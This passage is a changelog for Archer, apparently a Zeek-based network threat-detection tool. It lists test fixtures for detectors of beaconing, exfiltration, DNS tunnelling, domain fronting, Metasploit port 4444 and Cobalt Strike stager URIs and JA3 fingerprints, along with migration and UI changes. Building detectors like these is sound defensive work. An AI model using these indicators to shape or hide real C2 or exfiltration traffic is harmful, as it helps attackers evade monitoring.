  change lands. Findings are projected to a stable subset (no IDs, no
  reservoir-sampled `TSData`, no analyst mutations) and sorted before
  diffing so the result is independent of goroutine scheduling.
- **`prefetchFeeds` test-isolation guard.** When a feed cache is
  pre-populated (non-nil), the corresponding live HTTP fetch is
  skipped. Tests inject empty (non-nil) maps to neutralize the feeds
  without touching the public internet.
- **Conn-detector golden fixtures (Phase 4.2).** The golden-file test
  is now table-driven over scenario subdirectories under
  `internal/analysis/testdata/zeek/`. Six new scenarios cover every
  detector in `analyzeConn`: `strobe/` (1000-conn fan-out, also
  exercises beacon scoring under irregular timing), `long_connection/`
  (2-hour duration), `exfil/` (7.5 MB outbound, 30× ratio), `lateral/`
  (internal SMB), `c2_port/` (Metasploit default port 4444), and
  `off_hours/` (1.5 MB at 02:00 UTC). The original `beacon_url/`
  scenario was moved into its own subdirectory alongside the new
  ones. Each scenario has its own `README.md` documenting what's
  exercised and which findings it produces.
- **DNS-detector golden fixtures (Phase 4.3).** Five new scenarios
  cover every detector in `analyzeDNS`: `dns_doh_bypass/` (DNS to
  8.8.8.8:443), `dns_suspicious_tld/` (`evil.tk`),
  `dns_tunneling/` (qtype=TXT trip), `dns_nxdomain_flood/` (250
  NXDOMAINs of one query so subdomain diversity stays under
  threshold), and `dns_subdomain_diversity/` (50 unique subdomains
  under one apex). Each scenario fires exactly the targeted detector
  with no contamination.
- **HTTP-detector golden fixtures (Phase 4.4).** Six new scenarios
  cover every detector in `analyzeHTTP`: `http_suspicious_ua/` (curl
  UA), `http_cobalt_strike_uri/` (URI `/xyzaa` whose byte-sum modulo
  256 equals 92, the x86 stager checksum), `http_c2_uri_pattern/`
  (`/submit.php` regex match), `http_domain_fronting/` (paired
  `ssl.log` with SNI ≠ HTTP Host), `http_suspicious_file/`
  (`/payload.exe`), and `http_beacon/` (10 perfectly-regular
  requests).
- **SSL/TLS and X.509 golden fixtures (Phase 4.5).** Eight new
  scenarios. SSL: `ssl_malicious_ja3/` (Cobalt Strike beacon JA3),
  `ssl_weak_tls/` (TLSv10), `ssl_no_sni/` (established TLS without
  SNI on port 443), and `ssl_no_sni_c2_port/` (same but on port
  4444). X.509: `x509_self_signed/` (subject == issuer),
  `x509_default_subject/` (`openssl` substring), `x509_short_validity/`
  (8-hour validity window), and `x509_long_validity/` (26-year
  window). Each X.509 scenario locks in a distinct Detail-string
  indicator so a refactor that drops or reorders one of the
  cert-anomaly checks fails the test loudly.
- **Files / Weird / Notice golden fixtures (Phase 4.6).** Six new
  scenarios for the Zeek-passthrough analyzers.
  `files_suspicious_mime/` (MIME `application/x-dosexec`),
  `files_suspicious_ext/` (filename `loader.ps1`),
  `weird_protocol_anomaly/` (low-interest weird, default 22 / LOW),
  `weird_high_interest/` (`bad_HTTP_request` from the
  high-interest map, 65 / MEDIUM), `notice_zeek/`
  (`SSH::Login_From_New_Country`, default 68 / HIGH), and
  `notice_critical/` (note type containing `scan` keyword, 92 /
  CRITICAL).
- **TI-feed golden fixtures + per-scenario feeds (Phase 4.7).** The
  golden runner now accepts an optional `feeds.json` per scenario
  (schema: `feodo_ips`, `urlhaus_ips`, `urlhaus_hosts`). Two new
  scenarios use it: `ti_feodo_ip/` (FeodoTracker IP match,
  CRITICAL/99) and `ti_urlhaus_ip/` (URLhaus IP match,
  CRITICAL/97). The URLhaus *host* match path was already covered by
  `beacon_url/` via the default injection; these add the IP-match
  variants. With these in place, every detector that fires from
  `analyzeConn`, `analyzeDNS`, `analyzeHTTP`, `analyzeSSL`,
  `analyzeX509`, `analyzeFiles`, `analyzeWeird`, `analyzeNotice`,
  `checkSuspiciousURLs`, and `checkTI`'s offline (non-API) paths is
  now locked into a golden fixture.

### Changed
- One-time codebase reformat with `gofmt -w` so the new CI lint job
  passes from day one. Mechanical whitespace-only diff across 18 Go
  files; no behavior change. Aligned `:=` declaration blocks in a
  handful of files (`cmd/archer/main.go`, etc.) collapsed to standard
  single-space form. Future drift is caught by the CI gofmt check.
- README "Version: v0.1.0" stale literal at the top replaced with the
  CI badge plus a generic "Pre-1.0 — see CHANGELOG.md for the current
  release" line. The literal version was already drifting (we shipped
  v0.2.0 and v0.3.0 without updating it); the analyst-UI status pill
  and `/api/version` endpoint are the live source of truth.

### Detection changes
- **Host Risk Score `Detail` field is now sorted alphabetically.** The
  detection-types list rendered into the finding's Detail string was
  iterated from a Go map, which produced non-deterministic ordering
  across runs. Same set, same composite score — only the rendered
  ordering changes. Existing analyst notes referencing the old order
  are unaffected (the Detail field is fresh on each analysis pass and
  not part of the fingerprint).
- **Off-Hours Transfer is now timezone-aware.** The off-hours window
  (`OffHoursStart`/`OffHoursEnd` config fields) is interpreted in the
  operator's configured `Timezone` instead of UTC. A team in
  `America/New_York` setting Timezone to that name will now see
  off-hours fire for activity between 22:00 and 06:00 EST/EDT — what
  an analyst expects when they say "off-hours" — instead of the
  literal UTC window. With the default empty Timezone (= UTC) the
  behavior is unchanged. Bad/unparseable IANA names fall back to UTC
  defensively. The finding's Detail string now also surfaces the
  resolved timezone abbreviation (e.g. "02:xx EST"), where it
  previously hardcoded "UTC". Re-baseline hunts that depend on
  off-hours hits if you change Timezone.

### Breaking
- **Config field renamed: `WatchTimezone` → `Timezone`.** This is the
  same operator-timezone setting, now shared by the watch scheduler
  and the off-hours detector. The HTTP API for `/api/watch` was
  already using `timezone` as the JSON key (so no client/UI change),
  but the underlying stored config used `watch_timezone`. On first
  startup after upgrading, any existing operator timezone setting
  will read as empty (UTC default) — re-set the timezone via the
  Watch sidebar and it'll persist under the new key.

---

## [v0.3.0] — 2026-05-08

DB schema changes are now first-class numbered migrations instead of
inline `CREATE`/`ALTER` calls, so future column additions can't strand
existing installs mid-mission. Operator-facing improvements to the
allowlist / IOC list dialogs (comments, stable order) and a handful of
analyst-loop bug fixes round out the release. Existing installs upgrade
in place — the migration runner detects pre-Phase-3 schemas and stamps
version 1 without touching the data.

### Added
- **DB schema migration framework.** Schema changes are now expressed
  as numbered SQL files under `internal/store/migrations/` (embedded
  via `embed.FS`) and applied transactionally on server start. A new
  `schema_migrations` table records which versions have been applied;
  the runner skips already-applied migrations and aborts startup loudly
  on any failure rather than reaching handler code with a half-applied
  schema. Existing installs that predate the framework are detected by
  the presence of the `findings` table and have version 1 stamped
  without re-running 0001 — operator data is preserved untouched.
  Adding a future schema change is now: drop a new `NNNN_<title>.sql`
  file, write Go code against the new shape, write a CHANGELOG entry.
  See `RELEASING.md` "Schema migrations" for the policy and
  `docs/ARCHITECTURE.md` for the runner's data flow.
- **Comments and stable order in the allowlist / IOC list dialogs.**
  Lines starting with `#` are first-class comments that round-trip
  through save/reload — operators can use them as section headers
  (`# Cloud build agents`, `# Cobalt Strike beacons seen 2026-04`).
  Inline tails like `1.2.3.4 # office` are stripped down to the
  matchable entry at storage time. Whole-line comments are skipped by
  the matcher, never causing false positives or negatives. Both list
  dialogs now show a small hint above the textarea explaining the
  conventions.
- Test coverage for the migration framework
  (`internal/store/migrate_test.go`) and for list comment-handling and
  order preservation (`internal/store/list_test.go`).

### Changed
- `Store.InitDB` and `UserStore.NewUserStore` no longer create or alter
  schema inline — the migration runner does it before either gets the
  DB handle. The previous one-shot `dataset → sensor` rename, the
  `suppressions.detail` ALTER, and the `users.status` ALTER are now
  baked into `0001_init.sql` as column definitions; on existing installs
  these were already applied at boot of the previous version, so the
  bootstrap-stamp logic carries them forward without re-running.
- **Allowlist and IOC list now preserve operator line order across the
  save/reload cycle.** Previously the in-memory storage was a Go map,
  which randomized iteration on every read — operator groupings (and
  any visual structure) shuffled on each list dialog open. The store
  now keeps an ordered slice, persists in slice order via SQLite rowid,
  and reads back with `ORDER BY rowid`. Existing installs are cleaned
  automatically on first start (junk comment-strings stored by older
  Archer get sanitized at load time).
- Right-click context menu no longer carries a wide
  `[severity] Type — src → dst:port` banner that forced the menu wider
  than the longest action label. A small `↖` arrow at the top-left
  visually anchors the menu to the click point; the action labels
  themselves already include the resolved IP, so disambiguation
  survives the simplification.
- Right-click → Lookup → Censys now opens `platform.censys.io/hosts/<ip>`
  instead of `search.censys.io/hosts/<ip>`. Censys migrated their
  analyst-facing UI to the new platform host in 2026; the path is
  unchanged. The programmatic escalation lookup at
  `internal/server/handlers_api.go:601` still hits `search.censys.io`
  because Censys's API endpoint stayed stable across the UI rebrand.

### Fixed
- **Active findings filter is no longer lost when you mutate state from
  the analyst UI.** Adding an IP to the Allowlist (right-click or save
  dialog), suppressing or unsuppressing a finding, and the post-analyze
  refresh all called `loadFindings()` with no params, which dropped the
  current filter (search, src/dst, port, sensor, time window) and
  refetched the unfiltered dataset. The form fields stayed visible but
  the underlying data ignored them until the operator hit Apply or
  refreshed the page. All six call sites now pass `_currentFilterParams()`
  so the filter survives the round-trip.

---

## [v0.2.0] — 2026-05-07

Quiver wire protocol now carries an explicit version handshake so old
sensors against new servers fail loudly with a structured error
instead of silently breaking rsync. v1 is the first pinned protocol;
its full contract surface (wire shapes, sensor name regex, pubkey
algorithm, rsync layout, schedule contract, accepted Zeek log types)
is documented in `docs/QUIVER.md` so future v2 bumps have a clear
baseline. Pre-Phase-2 sensors that omit the version field are accepted
as v1 for one compatibility cycle; the flip to a hard rejection will
be announced under `### Deprecated` before the cycle closes.

### Added
- **Quiver protocol versioning.** Both enrollment (`/api/quiver/enroll`)
  and checkin (`/api/quiver/checkin`) now exchange a `protocol_version`
  integer. The server validates against an internal supported-versions
  set and rejects mismatches with a structured error so operators see
  "your sensor is on v1, server requires v2+" instead of an opaque
  rsync failure later. See `docs/QUIVER.md` "Protocol versioning" for
  the v1 contract surface, when to bump, and the deprecation cycle.
- `internal/server/quiver_protocol.go` — `QuiverProtocolVersion`
  constant, `supportedQuiverProtocols` set, validator helper.
- `PROTOCOL_VERSION=1` constant in `quiver_assets/install.sh` and
  `quiver_assets/quiver.sh`; persisted to `/etc/quiver/config`.
- Enrollment failures from `install.sh` now log the server's response
  body so a protocol mismatch surfaces the supported-versions list at
  install time, before any local state is committed.
- New `protocol_unsupported` checkin status; `quiver.sh` handles it by
  logging the supported set and exiting cleanly (sensor row stays
  enrolled — reinstall from the current Archer build to fix).
- Test coverage for protocol validation:
  `internal/server/quiver_protocol_test.go` exercises
  `resolveQuiverProtocol` (nil default, supported, unsupported), the
  canonical error body, and both handlers' rejection + backwards-compat
  paths (9 cases). First step toward Phase 4 (detection-semantics tests).
- QUIVER.md "Protocol versioning" section now pins the implicit pieces of
  the v1 contract (sensor name regex, pubkey algorithm, accepted Zeek
  log-type regex, `--remove-source-files`-never-set rsync semantics) so a
  future v2 bump has a clear baseline.

### Changed
- Sensors enrolled before this release that omit `protocol_version` are
  accepted as v1 for one compatibility cycle. The flip to a hard error
  on a missing field will be announced under `### Deprecated` before
  the cycle closes.

---

## [v0.1.0] — 2026-05-07

The first versioned release of Archer. Establishes a single source of
truth for the build identifier, surfaces it in the UI and JSON exports,
and starts this changelog. Functional behavior is unchanged from the
in-tree state at the cut.

### Added
- `internal/version` package with `Version`, `Commit`, `BuildTime` vars
  populated by `-ldflags -X` at build time.
- `/api/version` endpoint returning the running build identifier.
  Unauthenticated; same diagnostic tier as a future `/api/health`.
- Version pill in the analyst-UI status bar; click opens an "About"
  dialog with full version, commit, and build-time details.
- `start.sh` derives `ARCHER_VERSION` / `ARCHER_COMMIT` /
  `ARCHER_BUILD_TIME` from the git checkout (`git describe --tags
  --always --dirty`, `git rev-parse --short HEAD`, `date -u +%FT%TZ`)
  and passes them through `docker-compose` build args.
- OCI image labels (`org.opencontainers.image.version`,
  `org.opencontainers.image.revision`, `org.opencontainers.image.title`,
  `org.opencontainers.image.source`) so `docker inspect` reports the
  build identifier without needing to start a container.
- Top-level `RELEASING.md` documenting the release runbook (bump version,
  update changelog, commit, tag, push).

### Changed
- JSON exports now read the `archer_version` field from the build's
  `internal/version.Version` instead of the previous hardcoded
  `"3.0.0-go"` string. Affects `/api/export/json`, the campaigns export,
  the per-campaign Graphology export, and the Hosts JSON export.

### Notable changes since the last informal cut

The following were already merged before versioning landed and are
listed for completeness — they are part of the v0.1.0 baseline:

- **Two-tier watch cadence.** Watch mode runs the full pipeline only on
  the first tick of each UTC day; subsequent same-day ticks run a cheap
  incremental TI/IOC pass over mtime-filtered new files. A `Always run
  full scan on every watch tick` toggle in Settings reverts to the
  previous all-full behavior.
- **Two-phase TI scan.** The TI escalation pass is now a cheap
  destination-only sweep that builds candidate sets, followed by a
  targeted per-source pass restricted to "winning" destinations. On a
  15 GiB log corpus this cuts wall time by ~6-10× and avoids the GC
  thrash that the previous per-source-everywhere implementation hit at
  the GOMEMLIMIT ceiling.
- **TI cross-annotation.** When an automated TI hit produces new info
  for an IP, sibling findings touching the same IP get an analyst note
  pointing to the TI evidence — eliminates the "I have a TI hit but no
  way to find which host saw it" dead end.
- **Per-source TI fan-out.** TI hits now produce one finding per
  distinct source that contacted the bad destination, with real
  src/port/timestamp/URI evidence — instead of a single dead-end
  `(TI) → 1.2.3.4` row.
- **Findings/Hosts tab split.** `Host Risk Score` per-host roll-ups now
  live in the Hosts tab (click a row to drill in). The Findings tab is
  network events only.
- **Quiver: install-time backfill prompt.** The install script asks the
  operator how many days of historical logs to ship on first sync;
  honored by `quiver.sh` on `FIRST_SYNC=1`. Override with
  `INITIAL_BACKFILL_DAYS=N`.
- **Watch sidebar shows full-vs-incremental.** The sidebar surfaces the
  next tick's kind (`Full Scan` or `Incremental TI/IOC`) plus the next
  full scan's relative date — analysts can tell at a glance what the
  cadence will produce.
- **Stop button feedback.** Clicking Stop disables both Stop and Pause
  and relabels the button "Stopping…" while the analyzer drains.
- **Air-gap installation.** README documents the build-on-connected →
  ship-tarball → `docker load` install pattern.
- **Sensors modal.** Enrolled sensors, pending tokens, and unauthorized
  enrollment attempts are surfaced in the UI for admins.
- **TLS auto-bootstrap.** Sensor-facing HTTPS listener generates its
  own cert at first start; sensors pin the fingerprint at enrollment.
- **CIDR-aware allowlist + IOC matching.** Plus a Dst Port filter on the
  Findings tab.
- **Cytoscape graph view.** Plus PNG/JPEG export of the campaign graph.
- **Bounded-memory analyzer + log archive.** Auto-archive of logs older
  than the cutoff; optional findings prune. Disk-usage telemetry pulls
  to the Settings dialog so the admin doesn't need to ssh in.
- **Admin approval for new user registrations.** Pending-count badge on
  the Users button.
- **Detection-methods reference doc** at `docs/DETECTION_METHODS.md`
  covering all 12 detector families plus the retention vs. detection
  window math.

### Detection changes

None at the v0.1.0 cut — this release is versioning scaffolding only.
The baseline detection behavior is the in-tree state at this cut.

### Breaking

- The legacy `archer_version: "3.0.0-go"` string in JSON exports is
  replaced with the runtime version (`v0.1.0` at this cut). Any external
  tooling that parsed the literal as a sentinel needs a one-line update.

[Unreleased]: https://github.com/BushidoCyb3r/Archer/compare/v0.25.0...HEAD
[v0.25.0]: https://github.com/BushidoCyb3r/Archer/compare/v0.24.0...v0.25.0
[v0.24.0]: https://github.com/BushidoCyb3r/Archer/compare/v0.23.0...v0.24.0
[v0.23.0]: https://github.com/BushidoCyb3r/Archer/compare/v0.22.0...v0.23.0
[v0.22.0]: https://github.com/BushidoCyb3r/Archer/compare/v0.21.0...v0.22.0
[v0.21.0]: https://github.com/BushidoCyb3r/Archer/compare/v0.20.2...v0.21.0
[v0.20.2]: https://github.com/BushidoCyb3r/Archer/compare/v0.20.1...v0.20.2
[v0.20.1]: https://github.com/BushidoCyb3r/Archer/compare/v0.20.0...v0.20.1
[v0.20.0]: https://github.com/BushidoCyb3r/Archer/compare/v0.19.0...v0.20.0
[v0.19.0]: https://github.com/BushidoCyb3r/Archer/compare/v0.18.10...v0.19.0
[v0.14.0]: https://github.com/BushidoCyb3r/Archer/compare/v0.13.0...v0.14.0
[v0.13.0]: https://github.com/BushidoCyb3r/Archer/compare/v0.12.0...v0.13.0
[v0.12.0]: https://github.com/BushidoCyb3r/Archer/compare/v0.11.0...v0.12.0
[v0.11.0]: https://github.com/BushidoCyb3r/Archer/compare/v0.10.0...v0.11.0
[v0.10.0]: https://github.com/BushidoCyb3r/Archer/compare/v0.9.0...v0.10.0
[v0.9.0]: https://github.com/BushidoCyb3r/Archer/compare/v0.8.0...v0.9.0
[v0.8.0]: https://github.com/BushidoCyb3r/Archer/compare/v0.7.0...v0.8.0
[v0.7.0]: https://github.com/BushidoCyb3r/Archer/compare/v0.6.0...v0.7.0
[v0.6.0]: https://github.com/BushidoCyb3r/Archer/compare/v0.5.0...v0.6.0
[v0.5.0]: https://github.com/BushidoCyb3r/Archer/compare/v0.4.0...v0.5.0
[v0.4.0]: https://github.com/BushidoCyb3r/Archer/compare/v0.3.0...v0.4.0
[v0.3.0]: https://github.com/BushidoCyb3r/Archer/compare/v0.2.0...v0.3.0
[v0.2.0]: https://github.com/BushidoCyb3r/Archer/compare/v0.1.0...v0.2.0
[v0.1.0]: https://github.com/BushidoCyb3r/Archer/releases/tag/v0.1.0
